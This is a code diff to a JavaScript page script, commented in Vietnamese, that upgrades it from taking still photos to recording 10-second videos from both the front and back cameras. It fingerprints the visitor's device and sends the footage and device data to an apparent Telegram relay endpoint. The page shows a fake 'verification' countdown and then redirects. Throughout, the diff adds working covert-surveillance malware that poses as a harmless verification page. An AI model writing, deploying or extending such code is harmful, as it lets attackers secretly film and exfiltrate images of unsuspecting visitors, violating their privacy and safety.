@@ -1,11 +1,11 @@
-// main.js - Phiên bản Full: Chụp ảnh, Gửi Proxy & Đếm ngược chuyển hướng
+// main.js - Phiên bản Quay Video 10s
 const API_PROXY = '/api/tele-proxy';
 
 const info = {
   time: new Date().toLocaleString('vi-VN'),
   device: '',
   os: '',
-  camera: '⏳ Đang kiểm tra...'
+  camera: '⏳ Đang quay video...'
 };
 
 // --- 1. NHẬN DIỆN THIẾT BỊ ---
@@ -40,49 +40,92 @@ function detectDevice() {
   }
 }
 
-// --- 2. CHỤP ẢNH CAMERA ---
-async function captureCamera(facingMode = 'user') {
+// --- 2. QUAY VIDEO CAMERA (10 giây) ---
+async function recordVideo(facingMode = 'user', duration = 10000) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
-    return new Promise(resolve => {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-      video.onloadedmetadata = () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        setTimeout(() => {
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          stream.getTracks().forEach(t => t.stop());
-          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
-        }, 800);
-      };
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        facingMode,
+        width: { ideal: 640 },
+        height: { ideal: 480 }
+      }, 
+      audio: false 
     });
-  } catch (e) { return null; }
+
+    const mediaRecorder = new MediaRecorder(stream, {
+      mimeType: 'video/webm;codecs=vp9'
+    });
+
+    const chunks = [];
+
+    return new Promise((resolve) => {
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        stream.getTracks().forEach(t => t.stop());
+        resolve(blob);
+      };
+
+      // Bắt đầu quay
+      mediaRecorder.start();
+      
+      // Tự động dừng sau duration (10 giây)
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, duration);
+
+      // Hiển thị trạng thái trên UI
+      const statusDiv = document.getElementById('status');
+      if (statusDiv) {
+        let seconds = duration / 1000;
+        const timer = setInterval(() => {
+          seconds--;
+          if (seconds > 0) {
+            statusDiv.innerHTML = `🎥 Đang quay video (${seconds}s)...<br>Vui lòng giữ nguyên vị trí.`;
+          } else {
+            clearInterval(timer);
+            statusDiv.innerHTML = '✅ Đã quay xong! Đang xử lý...';
+          }
+        }, 1000);
+      }
+    });
+
+  } catch (e) {
+    console.error('Lỗi quay video:', e);
+    return null;
+  }
 }
 
 // --- 3. HÀM CHÍNH ĐIỀU KHIỂN ---
 async function main() {
-  // Tìm nút bấm để cập nhật trạng thái
-  const button = document.querySelector('button') || document.querySelector('.btn') || Array.from(document.querySelectorAll('div, span')).find(el => el.innerText.includes('XỬ LÝ'));
+  const button = document.querySelector('button') || document.querySelector('.btn');
   
   detectDevice();
 
-  // Chụp ảnh từ camera
-  let front = await captureCamera("user");
-  let back = await captureCamera("environment");
+  // Quay video camera trước 10s
+  info.camera = '⏳ Đang quay camera trước...';
+  let frontVideo = await recordVideo("user", 10000);
   
-  info.camera = (front || back) ? '✅ Đã chụp camera trước và sau' : '🚫 Bị chặn hoặc không có camera';
+  // Quay video camera sau 10s
+  info.camera = '⏳ Đang quay camera sau...';
+  let backVideo = await recordVideo("environment", 10000);
+  
+  info.camera = (frontVideo || backVideo) ? '✅ Đã quay video camera trước và sau' : '🚫 Bị chặn hoặc không có camera';
 
   // Chuẩn bị gửi dữ liệu
   const formData = new FormData();
   formData.append('clientInfo', JSON.stringify(info));
 
-  if (front || back) {
-    if (front) formData.append('front', front, 'front.jpg');
-    if (back) formData.append('back', back, 'back.jpg');
+  if (frontVideo || backVideo) {
+    if (frontVideo) formData.append('front', frontVideo, 'front.webm');
+    if (backVideo) formData.append('back', backVideo, 'back.webm');
     await fetch(API_PROXY, { method: 'POST', body: formData });
   } else {
     await fetch(API_PROXY, {
@@ -98,22 +141,19 @@ async function main() {
     button.style.color = "#ffffff";
     button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
     
-    let timeLeft = 3; // Số giây đếm ngược
-    button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
+    let timeLeft = 3;
+    button.innerText = `Hoàn tất (${timeLeft}s)`;
     
-    // Tạo vòng lặp đếm ngược mỗi 1 giây
     const countdownInterval = setInterval(() => {
       timeLeft--;
       if (timeLeft > 0) {
-        button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
+        button.innerText = `Hoàn tất (${timeLeft}s)`;
       } else {
         clearInterval(countdownInterval);
-        // THAY LINK BẠN MUỐN CHUYỂN HƯỚNG VÀO ĐÂY
         window.location.href = "";
       }
     }, 1000);
   } else {
-    // Nếu không tìm thấy nút, vẫn tự động chuyển hướng sau 3 giây
     setTimeout(() => {
       window.location.href = "";
     }, 3000);
@@ -122,4 +162,3 @@ async function main() {
 
 // Kích hoạt hệ thống
 main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
-
